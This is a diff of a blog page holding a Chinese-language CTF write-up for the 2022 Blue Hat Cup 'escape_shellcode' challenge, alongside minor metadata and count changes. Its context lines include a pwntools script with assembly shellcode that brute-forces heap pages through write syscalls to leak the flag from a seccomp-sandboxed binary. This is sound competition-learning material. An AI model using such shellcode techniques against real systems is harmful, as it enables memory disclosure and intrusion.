@@ -129,15 +129,13 @@
 
 
 
-<meta name="description" content="初赛escape_shellcode一道开启沙盒的shellcode题目，只允许我们用read和write，恶心的是居然把除了rip寄存器之外的所有寄存器都给覆盖成垃圾数据，导致我们不能泄露地址，也不能使用栈结构，最多能搜刮是rip里面存储的堆地址。所以我们采取爆破的方式来找flag，我们flag的低位保持0x120不变，所以只要往高位爆破就好。 注意几点：一个是我们会发现每次rip中的地址和堆起">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2022 蓝帽杯">
 <meta property="og:url" content="https://pursuezhou.github.io/2022/09/25/CTF/2022%E8%93%9D%E5%B8%BD%E6%9D%AF/index.html">
 <meta property="og:site_name" content="Pursue">
-<meta property="og:description" content="初赛escape_shellcode一道开启沙盒的shellcode题目，只允许我们用read和write，恶心的是居然把除了rip寄存器之外的所有寄存器都给覆盖成垃圾数据，导致我们不能泄露地址，也不能使用栈结构，最多能搜刮是rip里面存储的堆地址。所以我们采取爆破的方式来找flag，我们flag的低位保持0x120不变，所以只要往高位爆破就好。 注意几点：一个是我们会发现每次rip中的地址和堆起">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-09-24T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-03-13T12:06:59.366Z">
+<meta property="article:modified_time" content="2024-03-14T02:01:57.283Z">
 <meta property="article:author" content="Pursue">
 <meta property="article:tag" content="蓝帽杯">
 <meta name="twitter:card" content="summary">
@@ -428,8 +426,6 @@
       
         <h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><h3 id="escape-shellcode"><a href="#escape-shellcode" class="headerlink" title="escape_shellcode"></a>escape_shellcode</h3><p>一道开启沙盒的shellcode题目，只允许我们用read和write，恶心的是居然把除了rip寄存器之外的所有寄存器都给覆盖成垃圾数据，导致我们不能泄露地址，也不能使用栈结构，最多能搜刮是rip里面存储的堆地址。所以我们采取爆破的方式来找flag，我们flag的低位保持0x120不变，所以只要往高位爆破就好。</p>
 <p>注意几点：一个是我们会发现每次rip中的地址和堆起始地址的偏移不一样，所以要用位运算来解决，不能用sub汇编来解决求取堆起始地址的问题；第二是我们不能在汇编之外进行循环，要在汇编里面完成循环，否则地址随机化会导致爆破不成功；第三是注意rip不可访问的问题。</p>
-<span id="more"></span>
-
 <p>WP如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./escape_shellcode&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lea r13, [rip]</span></span><br><span class="line"><span class="string">mov r11, 0xfffffffff000</span></span><br><span class="line"><span class="string">and r13, r11				// 求得堆地址</span></span><br><span class="line"><span class="string">add r13, 0x120				// 使低位为0x120</span></span><br><span class="line"><span class="string">mov r10, r13</span></span><br><span class="line"><span class="string">mov r14, 0					// r14是每次起始地址减去的长度</span></span><br><span class="line"><span class="string">mov r15, 0x10000			// r15是循环的次数</span></span><br><span class="line"><span class="string">loop :</span></span><br><span class="line"><span class="string">mov r13, r10</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rdx, 0x30</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">sub r15, 1</span></span><br><span class="line"><span class="string">add r14, 0x1000				// 进行0x1000大小的递增</span></span><br><span class="line"><span class="string">sub r13, r14</span></span><br><span class="line"><span class="string">mov rsi, r13</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">cmp r15, 0</span></span><br><span class="line"><span class="string">ja loop						// r15大于0的时候进行跳转</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pld = asm(pld)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -614,7 +610,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
